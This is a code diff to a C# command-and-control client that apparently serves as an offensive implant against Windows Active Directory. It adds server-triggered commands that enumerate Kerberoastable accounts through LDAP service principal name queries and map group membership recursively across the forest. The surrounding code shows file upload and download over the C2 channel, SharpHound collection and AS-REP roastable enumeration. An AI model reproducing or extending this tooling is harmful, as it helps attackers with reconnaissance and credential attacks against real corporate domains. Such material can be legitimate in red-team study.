@@ -14,7 +14,7 @@ using System.DirectoryServices;
 using System.DirectoryServices.AccountManagement;
 using System.DirectoryServices.ActiveDirectory;
 //using System.Runtime.InteropServies;
-using System.Collections.Generic;
+using System.DirectoryServices.AccountManagement;
 
 
 namespace C2Client
@@ -92,7 +92,7 @@ namespace C2Client
                 }
                 catch (Exception e)
                 {
-                    result = "Error while Downloading file";
+                    result = e.Message;
                 }
                 return result;
             }
@@ -127,7 +127,7 @@ namespace C2Client
                 }
                 ps.Stop();
                 r.Close();
-                Thread.Sleep(4000);
+                Thread.Sleep(5000);
                 result = sw.ToString();
                 Console.WriteLine("Result is " + result);
 
@@ -241,6 +241,75 @@ namespace C2Client
             return result;
         }
 
+        public string GetKerberoastable()
+        {
+            string result ="";
+            try
+            {
+
+                Forest f = Forest.GetCurrentForest();
+                DomainCollection domains = f.Domains;
+                foreach (Domain d in domains)
+                {
+                    string domainName = d.Name.ToString();
+                    string[] dcs = domainName.Split('.');
+                    for (int i = 0; i < dcs.Length; i++)
+                    {
+                        dcs[i] = "DC=" + dcs[i];
+
+                    }
+
+                    StringWriter sw = new StringWriter();
+
+                    // DC=tech69,DC=local,DC=net 
+                    DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
+                    DirectorySearcher ds = new DirectorySearcher();
+                    ds.SearchRoot = de;
+                    ds.Filter = "(&(objectclass=user)(serviceprincipalname=*))";
+
+                    foreach(SearchResult sr in ds.FindAll())
+                    {
+                        sw.WriteLine("Sam Account Name: {0}", sr.Properties["samaccountname"][0]);
+                        sw.WriteLine("Service Principal Name: {0}", sr.Properties["serviceprincipalname"][0]);
+                        sw.WriteLine();
+                    }
+
+                    result += sw.ToString();
+                }
+                if (result == "")
+                {
+                    result = "No Accounts found";
+                }
+            }
+            catch (Exception e)
+            {
+                result = e.Message;
+            }
+
+            return result;
+
+        }
+
+        public StringWriter GetAllMembers(string groupName, string domainName,StringWriter sw)
+        {
+            
+            PrincipalContext p = new PrincipalContext(ContextType.Domain, domainName);
+            GroupPrincipal gp = GroupPrincipal.FindByIdentity(p, groupName);
+            foreach (Principal group in gp.GetMembers())
+            {
+                if (group.StructuralObjectClass == "user")
+                {
+                    sw.WriteLine("User: {0} is memberOf {1}", group.Name, groupName);
+                }
+                if (group.StructuralObjectClass == "group")
+                {
+                    sw.WriteLine("Group: {0} is memberOf {1}", group.Name, groupName);
+                    (new Program()).GetAllMembers(group.Name, domainName,sw);
+                }
+            }
+            return sw;
+        }
+
         public static void Main(string[] args)
         {
             if (args.Length != 4)
@@ -284,7 +353,8 @@ namespace C2Client
                         Thread uploader = new Thread(() => { cmd = p.UploadToServer(cs, filename); });
                         uploader.Name = "Uploader to server";
                         uploader.Start();
-                        Thread.Sleep(5000);
+                        uploader.Join();
+                       // Thread.Sleep(5000);
                         /*
                         byte[] filecontents = File.ReadAllBytes(filename);
                         string base64contents = Convert.ToBase64String(filecontents);
@@ -302,10 +372,10 @@ namespace C2Client
                         Thread downloader = new Thread(() => { cmd = p.DownloadFromServer(cs, filename_to_download, destinationfile, filesize2); });
                         downloader.Name = "File Downloader";
                         downloader.Start();
-
+                        downloader.Join();
                         //File.WriteAllBytes(@"C:\Windows\Temp\" + file2, contents);
 
-                        Thread.Sleep(3000);
+                       // Thread.Sleep(3000);
                         cmd = "got file";
 
                     }
@@ -322,7 +392,7 @@ namespace C2Client
                         sharp.Name = "Sharphoundzip";
                         sharp.Start();
                         sharp.Join();
-                        Thread.Sleep(2000);
+                       Thread.Sleep(2000);
 
                     }
                     else if (cmd == "Get-ASREPRoastable")
@@ -331,8 +401,61 @@ namespace C2Client
                         Thread asrep = new Thread(() => { cmd = p.GetASREPRoastable(cs); });
                         asrep.Name = "asreproastable";
                         asrep.Start();
+                        asrep.Join();
                         Console.WriteLine(cmd);
-                        Thread.Sleep(3000);
+                       
+                    }
+                    else if (cmd == "Get-Kerberoastable")
+                    {
+                        Program p = new Program();
+                        Thread kerberoast = new Thread(() => { cmd = p.GetKerberoastable(); });
+                        kerberoast.Name = "Get-Kerberoastable";
+                        kerberoast.Start();
+                        kerberoast.Join();
+
+                    }
+
+                    else if (cmd == "Get-GroupRecursive")
+                    {
+
+                        Program p = new Program();
+                        Forest f = Forest.GetCurrentForest();
+                        DomainCollection domains = f.Domains;
+                        StringWriter sw = new StringWriter();
+                        foreach (Domain d in domains)
+                        {
+                            string domainName = d.Name.ToString();
+                            string[] dcs = domainName.Split('.');
+                            for (int i = 0; i < dcs.Length; i++)
+                            {
+                                dcs[i] = "DC=" + dcs[i];
+
+                            }
+                            DirectoryEntry de = new DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dcs)));
+                            DirectorySearcher ds = new DirectorySearcher();
+                            ds.SearchRoot = de;
+                            ds.Filter = "(objectclass=group)";
+
+                            sw.WriteLine("-----Domain: {0}-----", domainName);
+                            foreach(SearchResult sr in ds.FindAll())
+                            {
+                                sw.WriteLine("------{0}------", sr.Properties["samaccountname"][0]);
+                                Thread groups = new Thread(() => { sw = p.GetAllMembers(sr.Properties["samaccountname"][0].ToString(), domainName, sw); });
+                                groups.Start();
+                                groups.Join();
+                                sw.WriteLine();
+                            }
+
+                        }
+                            
+                        //Thread groups = new Thread(() => { sw = p.GetAllMembers("Domain Admins", d.Name, sw); });
+                       // groups.Name = "groups";
+                        
+                        Thread.Sleep(2000);
+                        cmd = sw.ToString();
+                        Console.WriteLine(cmd);
+
+
                     }
                     else
                     {
